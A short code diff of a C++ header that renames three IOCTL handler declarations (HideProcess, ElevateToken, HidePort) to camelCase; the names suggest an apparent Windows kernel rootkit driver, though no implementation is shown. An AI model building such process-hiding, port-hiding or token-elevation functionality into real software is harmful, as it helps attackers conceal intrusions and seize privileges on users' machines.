@@ -3,9 +3,9 @@
 
 namespace IoctlHandlers {
 
-	NTSTATUS HideProcess(PIRP Irp);
+	NTSTATUS hideProcess(PIRP irp);
 
-	NTSTATUS ElevateToken(PIRP Irp);
+	NTSTATUS elevateToken(PIRP irp);
 
-	NTSTATUS HidePort(PIRP Irp);
+	NTSTATUS hidePort(PIRP irp);
 }
